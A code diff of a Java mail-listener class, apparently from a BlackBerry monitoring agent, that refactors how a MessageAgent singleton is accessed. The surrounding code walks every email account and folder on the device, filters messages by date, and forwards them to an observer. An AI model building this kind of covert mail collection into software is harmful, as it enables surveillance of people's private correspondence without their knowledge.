@@ -43,7 +43,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
     static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
     //#endif
 
- 
     String[] names;
     private boolean collecting;
 
@@ -51,9 +50,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
     private static ServiceRecord[] mailServiceRecords;
     private Filter realtimeFilter;
     private Filter collectFilter;
-
-
-    private MessageAgent messageAgent;
 
     //Vector mailObservers = new Vector();
     MailObserver mailObserver;
@@ -63,7 +59,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
     private static final long GUID = 0xc997041f3236870dL;
 
     private void MailListener() {
-        messageAgent = MessageAgent.getInstance();
+
     }
 
     public static synchronized MailListener getInstance() {
@@ -165,13 +161,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // realtime non guarda il lastcheck, li prende tutti.
             final int filtered = realtimeFilter.filterMessage(message, 0);
             if (filtered == Filter.FILTERED_OK) {
-                dispatch(message,
-                        realtimeFilter.maxMessageSize, "local");
+                dispatch(message, realtimeFilter.maxMessageSize, "local");
                 //#ifdef DEBUG
-                
-                    debug.trace("messagesAdded: "
-                            + message.getFolder().getName());
-                
+
+                debug.trace("messagesAdded: " + message.getFolder().getName());
+
                 //#endif
             } else {
                 //#ifdef DEBUG
@@ -180,8 +174,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
             }
 
             if (!collecting) {
-                messageAgent.lastcheckSet("COLLECT", new Date());
-                messageAgent.lastcheckSet(folderName, new Date());
+                MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
+                MessageAgent.getInstance().lastcheckSet(folderName, new Date());
             }
 
         } catch (final MessagingException ex) {
@@ -191,8 +185,9 @@ public final class MailListener implements FolderListener, SendListener { //, St
         }
     }
 
-    private synchronized void dispatch(Message message, int maxMessageSize, String string) {
-                 mailObserver.onNewMail(message, maxMessageSize, string);
+    private synchronized void dispatch(Message message, int maxMessageSize,
+            String string) {
+        mailObserver.onNewMail(message, maxMessageSize, string);
     }
 
     /*
@@ -236,7 +231,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
-        final Date lastCheckDate = messageAgent.lastcheckGet("COLLECT");
+        final Date lastCheckDate = MessageAgent.getInstance().lastcheckGet("COLLECT");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -245,7 +240,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
             debug.trace("Email account name: " + names[count]);
             //#endif
 
-            Date lastCheckDateName = messageAgent.lastcheckGet(names[count]);
+            Date lastCheckDateName = MessageAgent.getInstance().lastcheckGet(names[count]);
 
             //names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
@@ -256,20 +251,18 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // Scandisco ogni Folder dell'account di posta
             scanFolders(names[count], folders, lastCheckDateName);
 
-            messageAgent.lastcheckSet(names[count], new Date());
+            MessageAgent.getInstance().lastcheckSet(names[count], new Date());
         }
 
         // al termine degli scanfolder
-        messageAgent.lastcheckSet("COLLECT", new Date());
+        MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
 
         //#ifdef DEBUG
         debug.trace("End search");
         //#endif
 
         collecting = false;
-
     }
-
 
     /**
      * scansione ricorsiva della directories.
@@ -291,13 +284,13 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         if (collectFilter == null) {
             //#ifdef DEBUG
-            debug.trace("no collectFilter, messageAgent: " + messageAgent);
+            debug.trace("no collectFilter, messageAgent: " + MessageAgent.getInstance());
             //#endif
-            if (messageAgent != null) {
+            if (MessageAgent.getInstance() != null) {
                 //#ifdef DEBUG
                 debug.trace("new collectFilter");
                 //#endif
-                collectFilter = (Filter) messageAgent.filtersEMAIL
+                collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                         .get(Filter.TYPE_COLLECT);
             }
         }
@@ -367,8 +360,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
                                         "scanFolders: storeName != null");
                                 //#endif
 
-                                dispatch(message,
-                                        collectFilter.maxMessageSize, storeName);
+                                dispatch(message, collectFilter.maxMessageSize,
+                                        storeName);
 
                                 break;
                             case Filter.FILTERED_DISABLED:
@@ -537,8 +530,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
     }
 
-   
-
     /**
      * Start.
      */
@@ -554,11 +545,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
         //#endif
 
         // to forever
-        realtimeFilter = (Filter) messageAgent.filtersEMAIL
+        realtimeFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                 .get(Filter.TYPE_REALTIME);
 
         // history
-        collectFilter = (Filter) messageAgent.filtersEMAIL
+        collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                 .get(Filter.TYPE_COLLECT);
 
         // Controllo tutti gli account di posta
